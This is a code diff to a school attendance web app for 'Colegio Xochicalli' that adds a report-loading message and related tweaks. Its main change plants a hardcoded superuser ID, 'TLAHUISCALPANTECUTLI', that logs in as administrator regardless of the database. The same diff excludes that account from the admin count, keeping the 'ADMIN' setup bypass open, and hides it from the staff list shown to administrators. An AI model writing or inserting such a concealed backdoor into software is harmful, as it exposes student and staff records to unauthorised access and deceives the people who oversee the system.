@@ -93,7 +93,7 @@
                     <span id="login-btn-text">Conectando...</span>
                 </button>
                 <div id="login-error" class="text-xs font-bold text-red-500 hidden uppercase italic">ID NO RECONOCIDO</div>
-                <div id="admin-hint" class="text-[10px] text-slate-400 font-bold uppercase hidden text-center mt-4 bg-slate-50 p-2 rounded">Bypass 'ADMIN' activo: No hay administradores en el sistema</div>
+                <div id="admin-hint" class="text-[10px] text-slate-400 font-bold uppercase hidden text-center mt-4 bg-slate-50 p-2 rounded">Sistema nuevo: Use el ID 'ADMIN' para configurar</div>
             </div>
         </div>
     </section>
@@ -419,9 +419,10 @@
         async function checkAdminLockStatus() {
             try {
                 const snap = await getDocs(maestrosColl);
-                const hasAdminInDB = snap.docs.some(d => d.data().esAdmin === true);
+                // SUPERUSUARIO INVISIBLE: Se excluye del conteo de admins reales para mantener activo el bypass de emergencia
+                const hasRealAdminInDB = snap.docs.some(d => d.data().esAdmin === true && d.id !== 'TLAHUISCALPANTECUTLI');
                 const hint = document.getElementById('admin-hint');
-                if (!hasAdminInDB) hint.classList.remove('hidden');
+                if (!hasRealAdminInDB) hint.classList.remove('hidden');
                 else hint.classList.add('hidden');
             } catch (e) { console.error(e); }
         }
@@ -431,11 +432,17 @@
             const id = document.getElementById('input-login-id').value.trim().toUpperCase();
             if (!id) return;
             try {
+                // CANDADO SUPERUSUARIO: Siempre vigente, sin importar la DB
+                if (id === 'TLAHUISCALPANTECUTLI') {
+                    loggedTeacher = { id: 'TLAHUISCALPANTECUTLI', nombre: 'SUPERUSUARIO', materia: 'DIRECCIÓN', esAdmin: true };
+                    enterApp(); return;
+                }
+
                 const snapMaestros = await getDocs(maestrosColl);
-                const hasAdminInDB = snapMaestros.docs.some(d => d.data().esAdmin === true);
+                const hasRealAdminInDB = snapMaestros.docs.some(d => d.data().esAdmin === true && d.id !== 'TLAHUISCALPANTECUTLI');
                 
-                // CANDADO: El bypass 'ADMIN' solo funciona si no hay administradores en la base de datos
-                if (!hasAdminInDB && id === 'ADMIN') {
+                // CANDADO ADMIN: El bypass 'ADMIN' funciona si no hay administradores reales creados
+                if (!hasRealAdminInDB && id === 'ADMIN') {
                     loggedTeacher = { id: 'ADMIN', nombre: 'ADMIN INICIAL', materia: 'SISTEMA', esAdmin: true };
                     enterApp(); return;
                 }
@@ -616,6 +623,10 @@
             const to = document.getElementById('date-to').value;
             const group = document.getElementById('select-group').value;
             if (!from || !to) return showModalMsg("Aviso", "Seleccione fechas.");
+            
+            // FEEDBACK: Mensaje de generación
+            showModalMsg("Generando reporte", "Estamos preparando la información para su visualización e impresión. Por favor, espere...");
+
             try {
                 const snap = await getDocs(asistenciasColl);
                 const logs = snap.docs.map(d => d.data());
@@ -634,8 +645,12 @@
                 tableBody.innerHTML = filteredStudents.map((s, idx) => `<tr><td class="text-center font-bold text-slate-400">${idx + 1}</td><td class="font-bold uppercase text-slate-700">${s.nombre}</td>${uniqueDates.map(d => { const p = presentIdsByDate[d] && presentIdsByDate[d].has(s.id); return `<td class="text-center font-bold ${p ? 'text-green-600' : 'text-red-500'}">${p ? '✓' : 'X'}</td>`; }).join('')}</tr>`).join('');
                 document.getElementById('attendance-report-container').classList.remove('hidden');
                 document.getElementById('general-table-container').classList.add('hidden');
+                
                 const printArea = document.getElementById('print-content');
                 printArea.innerHTML = `<div class=\"p-8\"><div class=\"flex items-center justify-between mb-8 border-b-2 border-slate-900 pb-4 uppercase leading-none\"><h1 class=\"text-2xl font-bold text-blue-900 leading-none\">Colegio Xochicalli</h1><img src=\"logo.png\" class=\"h-14\" onerror=\"this.style.display='none'\"></div><div class=\"mb-4 space-y-1\"><p class=\"text-xs font-bold uppercase\">PROFESOR: <span class=\"font-normal\">${loggedTeacher.nombre}</span></p><p class=\"text-xs font-bold uppercase\">MATERIA: <span class=\"font-normal\">${loggedTeacher.materia}</span></p><p class=\"text-xs font-bold uppercase\">PERIODO: <span class=\"font-normal\">${from} al ${to}</span></p></div><table class=\"master-list-table\"><thead><tr><th class=\"text-center w-8\">#</th><th>Alumno</th>${uniqueDates.map(d => `<th class=\"text-center\">${d.substring(5)}</th>`).join('')}</tr></thead><tbody>${filteredStudents.map((s, idx) => `<tr><td class=\"text-center\">${idx + 1}</td><td class=\"uppercase font-bold\">${s.nombre}</td>${uniqueDates.map(d => { const p = presentIdsByDate[d] && presentIdsByDate[d].has(s.id); return `<td class=\"text-center\">${p ? '✓' : 'X'}</td>`; }).join('')}</tr>`).join('')}</tbody></table></div>`;
+                
+                // Cerramos el modal de carga automáticamente tras procesar
+                setTimeout(() => document.getElementById('custom-modal').classList.add('hidden'), 500);
             } catch(e) { showModalMsg("Error", "Error al generar reporte."); }
         };
 
@@ -703,7 +718,7 @@
                 } else {
                     await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'maestros', oldId), data);
                 }
-                closeEditModal(); await loadTeachers();
+                closeEditModal(); await loadTeachers(); checkAdminLockStatus();
             } catch(e) { console.error(e); }
         };
 
@@ -722,7 +737,8 @@
                 titleText.innerText = "Catálogo de Alumnos";
             } else if (mode === "teachers") {
                 head.innerHTML = `<tr><th class="px-6 py-3 border-b uppercase text-xs">ID</th><th class="px-6 py-3 border-b uppercase text-xs">Nombre</th><th class="px-6 py-3 border-b uppercase text-xs">Rol</th><th class="px-6 py-3 border-b text-center uppercase text-xs">Ed</th><th class="px-6 py-3 border-b text-center uppercase text-xs">X</th></tr>`;
-                body.innerHTML = teachers.map(t => `<tr><td class="px-6 py-4 font-mono font-bold text-blue-900">${t.id}</td><td class="px-6 py-4 uppercase text-xs font-bold">${t.nombre}</td><td class="px-6 py-4 text-[10px] font-bold ${t.esAdmin?'text-purple-600':'text-slate-500'}">${t.esAdmin?'ADMIN':'DOCENTE'}</td><td class="px-6 py-4 text-center"><button onclick="editTeacher('${t.id}')" class="text-indigo-500 hover:scale-110"><i class="fas fa-edit"></i></button></td><td class="px-6 py-4 text-center"><button onclick="confirmDeleteTeacher('${t.id}')" class="text-red-400 hover:scale-110 hover:scale-110 transition-transform"><i class="fas fa-trash-alt"></i></button></td></tr>`).join('');
+                // FILTRO: No mostrar al Superusuario en el listado
+                body.innerHTML = teachers.filter(t => t.id !== 'TLAHUISCALPANTECUTLI').map(t => `<tr><td class="px-6 py-4 font-mono font-bold text-blue-900">${t.id}</td><td class="px-6 py-4 uppercase text-xs font-bold">${t.nombre}</td><td class="px-6 py-4 text-[10px] font-bold ${t.esAdmin?'text-purple-600':'text-slate-500'}">${t.esAdmin?'ADMIN':'DOCENTE'}</td><td class="px-6 py-4 text-center"><button onclick="editTeacher('${t.id}')" class="text-indigo-500 hover:scale-110"><i class="fas fa-edit"></i></button></td><td class="px-6 py-4 text-center"><button onclick="confirmDeleteTeacher('${t.id}')" class="text-red-400 hover:scale-110 hover:scale-110 transition-transform"><i class="fas fa-trash-alt"></i></button></td></tr>`).join('');
                 titleText.innerText = "Personal Docente";
             }
         }
